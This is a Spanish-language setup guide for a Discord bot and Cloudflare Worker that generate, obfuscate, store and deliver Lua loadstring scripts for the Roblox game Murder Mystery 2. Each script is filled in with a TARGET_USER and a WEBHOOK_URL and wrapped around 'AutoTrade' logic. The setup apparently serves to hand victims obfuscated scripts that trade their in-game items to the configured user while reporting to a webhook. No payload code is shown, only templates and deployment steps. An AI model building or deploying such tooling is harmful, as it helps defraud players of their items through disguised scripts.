# ⚙️ Guía de Configuración Detallada

## 1. Discord Bot Setup

### 1.1 Crear la Aplicación

1. Abre https://discord.com/developers/applications
2. Haz clic en **"New Application"**
3. Dale un nombre descriptivo (ejemplo: `MM2 AutoTrade Bot`)
4. Acepta los términos
5. Verás tu Application ID en la sección **General Information**

### 1.2 Crear el Bot

1. En la barra lateral, ve a **"Bot"**
2. Haz clic en **"Add Bot"**
3. Bajo el nombre del bot, verás el token
4. Haz clic en **"Copy"** para copiar el token
5. Pégalo en tu archivo `.env` como `DISCORD_TOKEN`

⚠️ **IMPORTANTE**: Nunca compartas este token. Si se expone, reinicia el token desde Discord.

### 1.3 Configurar Intents

En la sección **Bot**, desplázate hasta **Privileged Gateway Intents** y activa:

- ✅ **Message Content Intent** - Necesario para leer mensajes
- ✅ **Server Members Intent** - Opcional, para info de miembros

### 1.4 Permisos OAuth2

1. Ve a la barra lateral y selecciona **"OAuth2"**
2. Haz clic en **"URL Generator"**
3. En **Scopes**, selecciona:
   - ✅ `bot`
4. En **Permissions**, selecciona:
   - ✅ Send Messages
   - ✅ Use Slash Commands
   - ✅ Send DMs to Users
   - ✅ Embed Links (para los embeds)

5. Copia la URL generada en la parte inferior
6. Abre esa URL en tu navegador
7. Selecciona el servidor donde quieres agregar el bot
8. Autoriza los permisos

**Ahora tu bot está en el servidor ✅**

---

## 2. Cloudflare Worker Setup

### 2.1 Crear Cuenta en Cloudflare

1. Ve a https://dash.cloudflare.com
2. Crea una cuenta gratuita
3. Agrega un dominio (puedes usar uno gratis o tu propio dominio)
4. Sigue los pasos de configuración

### 2.2 Crear el Worker

1. En el Dashboard de Cloudflare, ve a **Workers & Pages**
2. Haz clic en **"Create Application"**
3. Selecciona **"Create Worker"**
4. Nombre sugerido: `mm2-script-decoder`
5. Haz clic en **"Deploy"**

### 2.3 Editar el Código del Worker

1. En el editor que se abre, selecciona TODO el código (`Ctrl+A`)
2. Borra todo
3. Copia TODO el contenido de `cloudflare-worker.js` de este proyecto
4. Pégalo en el editor
5. Haz clic en **"Save and Deploy"**

### 2.4 Configurar KV Storage

#### 2.4.1 Crear el Namespace

1. En el Dashboard de Cloudflare, ve a **Workers** → **KV**
2. Haz clic en **"Create a namespace"**
3. Nombre: `SCRIPTS` (exactamente así, mayúsculas)
4. Haz clic en **"Create"**

#### 2.4.2 Vincular al Worker

1. Vuelve al editor de tu Worker
2. En la sección derecha, busca **"Bindings"** (o **"Environment Variables"**)
3. Haz clic en **"Add Binding"**
4. Configura:
   - **Variable Name**: `SCRIPTS`
   - **Type**: `KV Namespace`
   - **Namespace**: Selecciona `SCRIPTS` de la lista
5. Guarda
6. Haz clic en **"Save and Deploy"**

### 2.5 Agregar la Librería Pako

La descompresión en el Worker necesita `pako`. Hay dos formas:

#### Opción A: Import directo (RECOMENDADO)

En la PRIMERA línea del Worker (antes de `export default`), agrega:

```javascript
import pako from 'https://cdn.jsdelivr.net/npm/pako@2/dist/pako.es5.min.js';

export default {
  // ... resto del código
}
```

Luego haz clic en **"Save and Deploy"**

#### Opción B: Build settings (alternativa)

1. En el editor del Worker, ve a **"Settings"** (esquina superior derecha)
2. En **"Build settings"**, selecciona `esbuild`
3. En **"Build watch paths"**, agrega:
   ```
   import pako from 'https://cdn.jsdelivr.net/npm/pako@2/dist/pako.es5.min.js';
   ```
4. Guarda y despliega

### 2.6 Obtener la URL del Worker

Una vez deployado, tu Worker estará en:

```
https://mm2-script-decoder.TU-DOMINIO.workers.dev
```

Donde `TU-DOMINIO` es el dominio que configuraste en Cloudflare.

**Ejemplo real:**
```
https://mm2-script-decoder.ejemplo.com.workers.dev
```

Copia esta URL en tu `.env` como:
```
CLOUDFLARE_WORKER_URL=https://mm2-script-decoder.TU-DOMINIO.workers.dev
```

### 2.7 Testear el Worker

Una vez desplegado, abre en tu navegador:

```
https://tu-worker-url.workers.dev/
```

Deberías ver una respuesta JSON con el estado `"online"`.

---

## 3. Archivo .env

Crea un archivo `.env` en la raíz del proyecto con:

```
# Discord Bot Token (de la aplicación Discord)
DISCORD_TOKEN=tu_token_super_secreto_aqui

# URL del Cloudflare Worker (sin trailing slash)
CLOUDFLARE_WORKER_URL=https://mm2-script-decoder.tu-dominio.workers.dev
```

⚠️ **IMPORTANTE**: 
- Nunca commitees este archivo (está en `.gitignore`)
- Nunca lo compartas públicamente
- Si lo expones, regenera el token en Discord

---

## 4. Script Lua (mm2-script.lua)

El script es un template. Solo se modifican dos líneas automáticamente:

```lua
local TARGET_USER = "example"          -- Se reemplaza con el username
local WEBHOOK_URL = "example"          -- Se reemplaza con el webhook
```

### Agregar tu lógica de trading

1. Edita `mm2-script.lua`
2. Agrega tu lógica de AutoTrade en la función `autoTrade()`
3. El resto del script (ofuscación, compresión, upload) es automático

### Estructura del script

```lua
-- CONFIGURACIÓN (SOLO ESTAS DOS LÍNEAS SE CAMBIAN)
local TARGET_USER = "example"
local WEBHOOK_URL = "example"

-- TU CÓDIGO AQUÍ
-- Agrégalo en la función autoTrade()

-- Notificaciones automáticas por webhook
-- El script ya envía: Iniciado, Progreso, Completado, Errores
```

---

## 5. Ejecutar el Bot Localmente

### 5.1 Desarrollo

```bash
# Instalar dependencias
npm install

# Ejecutar en modo desarrollo (con auto-reload)
npm run dev
```

### 5.2 Producción

```bash
# Ejecutar normalmente
npm start
```

### 5.3 Logs

El bot imprime:
- ✅ Conexión exitosa
- 📊 Número de servidores
- 📝 Comandos registrados
- ✅ Scripts generados
- ❌ Errores detallados

---

## 6. Testing

### Probar el Bot en Discord

1. En tu servidor, escribe: `/generate script`
2. Selecciona "Murder Mystery 2"
3. Ingresa:
   - Username: `testuser`
   - Webhook: Usa un webhook válido (o créalo en Discord)
4. El bot debería enviarte un DM con el loadstring

### Probar el Worker

```bash
# Test del endpoint /store
curl -X POST https://tu-worker/store \
  -H "Content-Type: application/json" \
  -d '{"script":"base64_encoded_script"}'

# Test del endpoint /decode
curl https://tu-worker/decode?id=abc123

# Test del health check
curl https://tu-worker/
```

---

## 7. Deployment en Producción

### Railway (Recomendado)

1. Crea cuenta en https://railway.app
2. Conecta tu repo de GitHub
3. Configura variables:
   - `DISCORD_TOKEN`
   - `CLOUDFLARE_WORKER_URL`
4. Deploy automático

### Replit

1. Fork el proyecto en Replit
2. En **Secrets** (candado), agrega:
   - `DISCORD_TOKEN`
   - `CLOUDFLARE_WORKER_URL`
3. Ejecuta: `npm start`

### VPS (Linux - DigitalOcean, Linode, etc.)

```bash
# SSH en tu servidor
ssh user@your-server

# Instalar Node.js 18+
curl -fsSL https://deb.nodesource.com/setup_18.x | sudo -E bash -
sudo apt-get install -y nodejs

# Clonar proyecto
git clone https://github.com/tu-usuario/mm2-autotrade-bot.git
cd mm2-autotrade-bot

# Instalar dependencias
npm install

# Configurar .env
nano .env
# Pega tus credenciales

# Instalar PM2 (para ejecutar en background)
npm install -g pm2

# Iniciar el bot
pm2 start bot.js --name "mm2-bot"

# Guardar configuración
pm2 save
pm2 startup
```

El bot continuará ejecutándose incluso si desconectas SSH.

---

## 8. Variables de Entorno

### Requeridas:
- `DISCORD_TOKEN` - Token de tu bot Discord
- `CLOUDFLARE_WORKER_URL` - URL de tu Cloudflare Worker

### Opcionales:
- `PORT` - Puerto del servidor (si lo necesitas)
- `NODE_ENV` - `development` o `production`
- `LOG_LEVEL` - `debug`, `info`, `warn`, `error`

---

## 9. Seguridad

### ✅ Buenas prácticas:

1. **Nunca commitees `.env`** - Está en `.gitignore`
2. **Regenera tokens si se exponen** - Hacerlo en Discord
3. **Usa HTTPS siempre** - Cloudflare lo proporciona gratis
4. **Valida webhooks** - El bot lo hace automáticamente
5. **Limpia scripts viejos** - KV los borra en 30 días
6. **Usa variables de entorno** - Nunca valores hardcodeados

### ⚠️ No hacer:

- ❌ Compartir tokens de Discord/Cloudflare
- ❌ Commitear credenciales
- ❌ Usar contraseñas en texto plano
- ❌ Confiar en ofuscación como seguridad real

---

## 10. Troubleshooting

### Bot no responde

```bash
# Verificar conexión
npm run dev

# Revisa:
# 1. DISCORD_TOKEN es correcto
# 2. Bot tiene permiso de "Use Slash Commands"
# 3. Bot está en el servidor
```

### Worker devuelve 404

1. Verifica la URL en `.env`
2. Comprueba que KV está vinculado
3. Abre en navegador: `https://tu-worker/`

### Error de descompresión

1. Asegúrate de que pako está importado
2. Verifica que el script se comprimió correctamente
3. Revisa los logs de Cloudflare

---

**¡Todo listo! Tu bot debería funcionar ahora 🚀**
